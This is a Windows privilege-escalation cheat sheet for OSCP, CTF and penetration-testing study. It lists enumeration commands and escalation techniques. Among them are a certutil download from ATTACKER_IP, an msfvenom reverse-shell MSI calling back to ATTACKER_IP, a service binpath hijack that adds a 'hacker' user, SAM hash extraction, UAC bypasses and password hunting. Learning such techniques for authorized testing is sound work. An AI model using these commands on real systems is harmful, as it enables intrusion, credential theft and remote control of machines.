# Windows Privilege Escalation Cheat Sheet
Based on TryHackMe, HackTheBox, and OSCP Techniques

Optimized for OSCP / GPEN / CTF / Pentesting

---

# 1. Basic Enumeration (Always First)

## System Information

```powershell
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```

## OS Version

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## Network Information

```powershell
ipconfig /all
route print
netstat -ano
```

---

# 2. Automated Enumeration Tools

Run automated tools early.

Common tools:

- winPEAS
- Seatbelt
- PowerUp
- SharpUp
- Watson
- Windows Exploit Suggester

Example:

```powershell
winPEAS.exe
```

Upload tool:

```bash
python3 -m http.server 8000
```

Download on target:

```powershell
certutil -urlcache -f http://ATTACKER_IP/winpeas.exe winpeas.exe
```

---

# 3. User Enumeration

```powershell
net user
net user username
```

List administrators:

```powershell
net localgroup administrators
```

Current user:

```powershell
whoami
```

---

# 4. Check Privileges

```powershell
whoami /priv
```

Important privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

If SeImpersonatePrivilege exists, possible exploits:

- JuicyPotato
- PrintSpoofer
- RoguePotato
- GodPotato

Example:

```powershell
PrintSpoofer.exe -i -c cmd
```

---

# 5. Unquoted Service Paths

List services:

```powershell
wmic service get name,displayname,pathname,startmode
```

Example vulnerable path:

```
C:\Program Files\Some Service\service.exe
```

If unquoted, Windows searches:

```
C:\Program.exe
```

Check permissions:

```powershell
icacls "C:\Program Files\Some Service"
```

If writable → place malicious binary.

---

# 6. Weak Service Permissions

Check service configuration:

```powershell
sc qc service_name
```

Find modifiable services:

```powershell
accesschk.exe -uwcqv "Authenticated Users" *
```

Modify service:

```powershell
sc config service_name binpath= "cmd /c net user hacker password123 /add"
```

Restart service:

```powershell
sc stop service_name
sc start service_name
```

---

# 7. AlwaysInstallElevated

Check registry:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If both show:

```
AlwaysInstallElevated = 1
```

Create malicious MSI:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > shell.msi
```

Execute:

```powershell
msiexec /quiet /qn /i shell.msi
```

---

# 8. Stored Credentials

List stored credentials:

```powershell
cmdkey /list
```

Use stored credentials:

```powershell
runas /savecred /user:administrator cmd
```

Search files:

```powershell
dir /s *pass*
dir /s *cred*
```

---

# 9. Scheduled Tasks

List tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for:

- Writable scripts
- Tasks running as SYSTEM

---

# 10. Registry Privilege Escalation

Check autoruns:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Replace binary if path writable.

---

# 11. Startup Applications

Startup folder:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

If writable → place malicious executable.

---

# 12. DLL Hijacking

Steps:

1. Identify application loading missing DLL
2. Create malicious DLL
3. Place DLL in writable directory

Tools:

- Procmon
- winPEAS

---

# 13. Writable Services

Check service:

```powershell
sc qc service_name
```

Check permissions:

```powershell
icacls "C:\Program Files\Service"
```

Replace binary if writable.

---

# 14. Token Impersonation

If privilege exists:

```
SeImpersonatePrivilege
```

Use:

- JuicyPotato
- PrintSpoofer
- RoguePotato
- GodPotato

Example:

```powershell
PrintSpoofer.exe -i -c cmd
```

---

# 15. Weak Folder Permissions

Check permissions:

```powershell
icacls C:\Program Files
```

Using AccessChk:

```powershell
accesschk.exe -uws "Everyone" C:\
```

---

# 16. Password Hunting

Search registry:

```powershell
reg query HKLM /f password /t REG_SZ /s
```

Search files:

```powershell
findstr /si password *.txt *.ini *.config *.xml
```

---

# 17. SAM and SYSTEM Extraction

If SeBackupPrivilege exists:

```powershell
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

Extract hashes:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

---

# 18. UAC Bypass

Check UAC:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

Common bypasses:

- fodhelper
- eventvwr
- sdclt

Example:

```powershell
fodhelper.exe
```

---

# 19. Kernel Exploits

Check patches:

```powershell
systeminfo
```

Tools:

- Windows Exploit Suggester
- Watson
- Sherlock

Example exploit:

```
MS16-032
```

---

# 20. Quick PrivEsc Checklist (Exam Mode)

Step 1

```powershell
whoami
whoami /priv
```

Step 2

```powershell
systeminfo
```

Step 3

```powershell
winPEAS.exe
```

Step 4

```powershell
wmic service get name,pathname
```

Step 5

```powershell
schtasks /query /fo LIST /v
```

Step 6

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Step 7

```powershell
cmdkey /list
```

Step 8

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

---

# 21. Common PrivEsc Tools

Enumeration:

- winPEAS
- Seatbelt
- PowerUp
- SharpUp
- Sherlock
- Watson

Exploitation:

- JuicyPotato
- PrintSpoofer
- RoguePotato
- GodPotato

---

# 22. Useful File Locations

```
C:\Windows\System32\config
C:\Program Files
C:\ProgramData
C:\Users\*\AppData
C:\Windows\Tasks
```

---

# 23. Privilege Escalation Reasoning Model

Ask:

1. Who am I?
2. What privileges do I have?
3. What services run as SYSTEM?
4. Can I modify any binaries or scripts?
5. Are there stored credentials?

This structured reasoning helps identify escalation paths quickly.
